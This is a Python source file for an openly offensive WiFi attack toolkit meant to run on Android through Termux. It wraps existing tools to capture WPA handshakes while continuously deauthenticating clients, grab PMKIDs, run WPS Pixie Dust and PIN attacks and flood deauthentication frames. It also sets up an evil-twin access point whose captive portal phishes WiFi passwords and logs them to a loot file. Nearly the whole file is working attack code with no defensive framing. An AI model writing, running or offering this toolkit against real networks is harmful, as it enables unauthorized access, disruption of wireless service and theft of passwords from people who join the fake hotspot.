#!/usr/bin/env python3
# android_wifi.py — offensive WiFi toolkit that runs on Android (Termux)
# stdlib only. Shells out to aircrack-ng / hcxtools / hostapd / dnsmasq where present.
# Subcommands: scan, monitor, handshake, pmkid, wps, deauth, evil-twin, capture

import argparse
import os
import shlex
import signal
import socket
import subprocess
import sys
import threading
import time
from urllib.parse import urlparse

ROOT = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(ROOT, "android_work")
CAPTURES = os.path.join(WORK, "captures")
LOOT = os.path.join(WORK, "loot")

for d in (WORK, CAPTURES, LOOT):
    os.makedirs(d, exist_ok=True)


def sh(cmd, background=False, capture=True):
    """Run a shell command. Returns CompletedProcess or Popen."""
    args = shlex.split(cmd) if isinstance(cmd, str) else cmd
    if background:
        return subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return subprocess.run(args, capture_output=capture, text=True)


def have(binary):
    return subprocess.run(["which", binary], capture_output=True).returncode == 0


def root_check():
    return os.geteuid() == 0


# ---------------------------------------------------------------- scan

def cmd_scan(args):
    iface = args.interface or "wlan0"
    if have("airodump-ng"):
        print(f"[*] airodump-ng on {iface} (ctrl-c to stop)")
        try:
            subprocess.run(["airodump-ng", iface])
        except KeyboardInterrupt:
            print("\n[!] scan stopped")
    elif have("termux-wifi-scan"):
        out = sh("termux-wifi-scan", capture=True)
        print(out.stdout)
    else:
        print("[!] no scanner backend found. install aircrack-ng or use termux.")
        return 1
    return 0


# --------------------------------------------------------------- monitor

def cmd_monitor(args):
    iface = args.interface or "wlan0"
    if not root_check():
        print("[!] monitor mode requires root")
        return 1
    if not have("airmon-ng") and not have("iw"):
        print("[!] install aircrack-ng or wireless-tools for monitor mode")
        return 1
    if args.down:
        if have("airmon-ng"):
            sh(f"airmon-ng stop {iface}")
        else:
            sh(f"iw dev {iface} del")
        print(f"[*] {iface} taken out of monitor mode")
        return 0
    if have("airmon-ng"):
        sh(f"airmon-ng start {iface}")
    else:
        sh(f"ip link set {iface} down")
        sh(f"iw dev {iface} set type monitor")
        sh(f"ip link set {iface} up")
    mon = iface if args.down else (iface + "mon" if not iface.endswith("mon") else iface)
    print(f"[*] {mon} in monitor mode")
    return 0


# ------------------------------------------------------------- handshake

def cmd_handshake(args):
    """Capture WPA 4-way handshake with optional deauth to force reauth."""
    iface = args.interface or "wlan0mon"
    bssid = args.bssid
    channel = args.channel
    out = os.path.join(CAPTURES, f"handshake_{bssid.replace(':','')}.cap")

    if not root_check():
        print("[!] handshake capture requires root")
        return 1
    if not have("airodump-ng"):
        print("[!] airodump-ng required")
        return 1

    os.makedirs(CAPTURES, exist_ok=True)

    # deauth to force handshake
    def deauth_loop():
        time.sleep(3)
        while not deauth_loop.stop:
            if have("aireplay-ng"):
                sh(f"aireplay-ng --deauth 0 -a {bssid} {iface}", background=True)
            time.sleep(30)
    deauth_loop.stop = False
    t = threading.Thread(target=deauth_loop, daemon=True)
    t.start()

    cmd = ["airodump-ng", "--bssid", bssid, "-c", str(channel), "-w", out, iface]
    print(f"[*] capturing handshake -> {out}")
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        pass
    deauth_loop.stop = True
    print(f"[!] capture stopped. handshake file: {out}.cap*")
    return 0


# ---------------------------------------------------------------- pmkid

def cmd_pmkid(args):
    """PMKID capture against WPA-PSK (no handshake needed, no client needed)."""
    iface = args.interface or "wlan0mon"
    out = os.path.join(CAPTURES, f"pmkid_{int(time.time())}.pcap")

    if not root_check():
        print("[!] PMKID capture requires root")
        return 1
    if not have("hcxdumptool"):
        print("[!] hcxdumptool required (hcxtools suite)")
        return 1

    print(f"[*] PMKID capture -> {out}")
    try:
        subprocess.run(["hcxdumptool", "-i", iface, "-o", out, "--enable_status"])
    except KeyboardInterrupt:
        pass
    print(f"[!] capture stopped: {out}")
    print(f"[*] convert: hcxpcapngtool -o {out}.hc22000 {out}")
    return 0


# ------------------------------------------------------------------- wps

def cmd_wps(args):
    """WPS Pixie Dust / offline PIN attack (no brute force on AP)."""
    iface = args.interface or "wlan0mon"
    bssid = args.bssid

    if not have("wash") or not have("reaver"):
        print("[!] wash + reaver required")
        return 1

    # discover WPS-enabled APs
    print("[*] discovering WPS APs...")
    p = subprocess.Popen(["wash", "-i", iface], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    try:
        out, _ = p.communicate(timeout=15)
    except subprocess.TimeoutExpired:
        p.kill()
        out = ""
    print(out)

    if not bssid:
        print("[!] specify --bssid to attack")
        return 1

    # pixie dust first (offline, fast)
    print(f"[*] pixie dust against {bssid}")
    subprocess.run(["reaver", "-i", iface, "-b", bssid, "-K", "1", "-c", "1", "-vv"])

    # fallback: online pin (bounded)
    print(f"[*] online pin fallback against {bssid}")
    subprocess.run(["reaver", "-i", iface, "-b", bssid, "-c", "1", "-vv", "--lock-delay=300"])
    return 0


# ------------------------------------------------------------------ deauth

def cmd_deauth(args):
    """Deauthentication / disassociation flood."""
    iface = args.interface or "wlan0mon"
    bssid = args.bssid
    client = args.client or "ff:ff:ff:ff:ff:ff"
    count = args.count or 0

    if not have("aireplay-ng"):
        print("[!] aireplay-ng required")
        return 1

    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, "-c", client, iface]
    print(f"[*] deauth {bssid} <- {client} on {iface}")
    subprocess.run(cmd)
    return 0


# ------------------------------------------------------------ evil-twin

CAPTIVE_HTML = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>WiFi Login</title></head>
<body>
<h2>WiFi Authentication Required</h2>
<form method="post" action="/login">
<label>Password: <input type="password" name="pass"></label><br>
<button type="submit">Connect</button>
</form>
</body></html>
"""

def cmd_evil_twin(args):
    """Rogue AP + captive portal (credential phish)."""
    iface = args.interface or "wlan0"
    ssid = args.ssid or "Free_WiFi"
    channel = args.channel or "6"
    out_iface = args.uplink or "eth0"

    if not root_check():
        print("[!] evil twin requires root")
        return 1
    for b in ("hostapd", "dnsmasq", "iptables"):
        if not have(b):
            print(f"[!] {b} required")
            return 1

    # hostapd.conf
    hostapd_conf = os.path.join(WORK, "hostapd.conf")
    with open(hostapd_conf, "w") as f:
        f.write(f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
ignore_broadcast_ssid=0
""")

    # dnsmasq.conf
    dnsmasq_conf = os.path.join(WORK, "dnsmasq.conf")
    with open(dnsmasq_conf, "w") as f:
        f.write(f"""interface={iface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
""")

    # captive portal (python http.server)
    portal_dir = os.path.join(WORK, "portal")
    os.makedirs(portal_dir, exist_ok=True)
    with open(os.path.join(portal_dir, "index.html"), "w") as f:
        f.write(CAPTIVE_HTML)
    creds_log = os.path.join(LOOT, "creds.txt")

    portal_py = os.path.join(WORK, "portal.py")
    with open(portal_py, "w") as f:
        f.write(f"""import http.server, socketserver
CREDS = "{creds_log}"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type","text/html")
        self.end_headers()
        self.wfile.write(open("{os.path.join(portal_dir,'index.html')}").read().encode())
    def do_POST(self):
        n = int(self.headers.get("Content-Length",0))
        body = self.rfile.read(n).decode()
        with open(CREDS,"a") as c:
            c.write(body + "\\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"authed")
    def log_message(self,*a): pass
socketserver.TCPServer(("10.0.0.1",80), H).serve_forever()
""")

    # bring up AP
    sh(f"ip link set {iface} down")
    sh(f"ip addr add 10.0.0.1/24 dev {iface}")
    sh(f"ip link set {iface} up")

    h = sh(f"hostapd {hostapd_conf}", background=True)
    d = sh(f"dnsmasq -C {dnsmasq_conf} -d", background=True)
    p = subprocess.Popen([sys.executable, portal_py])

    # NAT to uplink
    sh(f"iptables -t nat -A POSTROUTING -o {out_iface} -j MASQUERADE")
    sh("echo 1 > /proc/sys/net/ipv4/ip_forward")

    print(f"[*] evil twin {ssid} on {iface} ch {channel}")
    print(f"[*] captive portal on 10.0.0.1:80")
    print(f"[*] creds logged to {creds_log}")
    print("[!] ctrl-c to stop")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        p.terminate(); h.terminate(); d.terminate()
        sh(f"iptables -t nat -D POSTROUTING -o {out_iface} -j MASQUERADE")
        sh(f"ip link set {iface} down")
    return 0


# -------------------------------------------------------------- capture

def cmd_capture(args):
    """General 802.11 packet capture (pcap) for offline analysis."""
    iface = args.interface or "wlan0mon"
    out = os.path.join(CAPTURES, f"capture_{int(time.time())}.pcap")

    if not have("tcpdump") and not have("tshark"):
        print("[!] tcpdump or tshark required")
        return 1

    if have("tcpdump"):
        cmd = ["tcpdump", "-i", iface, "-w", out]
    else:
        cmd = ["tshark", "-i", iface, "-w", out]

    print(f"[*] capturing -> {out}")
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        pass
    print(f"[!] capture saved: {out}")
    return 0


# ------------------------------------------------------------------- main

def build_parser():
    p = argparse.ArgumentParser(prog="android_wifi", description="Android WiFi offensive toolkit")
    sub = p.add_subparsers(dest="cmd", required=True)

    def add_iface(sp):
        sp.add_argument("-i", "--interface", default="wlan0", help="wireless interface (default: wlan0)")

    sp = sub.add_parser("scan", help="scan for networks")
    add_iface(sp)
    sp.set_defaults(func=cmd_scan)

    sp = sub.add_parser("monitor", help="toggle monitor mode")
    add_iface(sp)
    sp.add_argument("--down", action="store_true", help="stop monitor mode")
    sp.set_defaults(func=cmd_monitor)

    sp = sub.add_parser("handshake", help="capture WPA 4-way handshake")
    add_iface(sp)
    sp.add_argument("--bssid", required=True, help="target BSSID")
    sp.add_argument("--channel", required=True, help="target channel")
    sp.set_defaults(func=cmd_handshake)

    sp = sub.add_parser("pmkid", help="PMKID capture (no handshake needed)")
    add_iface(sp)
    sp.set_defaults(func=cmd_pmkid)

    sp = sub.add_parser("wps", help="WPS Pixie Dust / offline PIN attack")
    add_iface(sp)
    sp.add_argument("--bssid", required=True, help="target BSSID")
    sp.set_defaults(func=cmd_wps)

    sp = sub.add_parser("deauth", help="deauthentication flood")
    add_iface(sp)
    sp.add_argument("--bssid", required=True, help="target BSSID")
    sp.add_argument("--client", default="ff:ff:ff:ff:ff:ff", help="client MAC (default: broadcast)")
    sp.add_argument("--count", type=int, default=0, help="number of deauths (0 = continuous)")
    sp.set_defaults(func=cmd_deauth)

    sp = sub.add_parser("evil-twin", help="rogue AP + captive portal")
    add_iface(sp)
    sp.add_argument("--ssid", default="Free_WiFi", help="rogue SSID")
    sp.add_argument("--channel", default="6", help="channel")
    sp.add_argument("--uplink", default="eth0", help="uplink interface for NAT")
    sp.set_defaults(func=cmd_evil_twin)

    sp = sub.add_parser("capture", help="general packet capture")
    add_iface(sp)
    sp.set_defaults(func=cmd_capture)

    return p


def main():
    p = build_parser()
    args = p.parse_args()
    sys.exit(args.func(args))


if __name__ == "__main__":
    main()
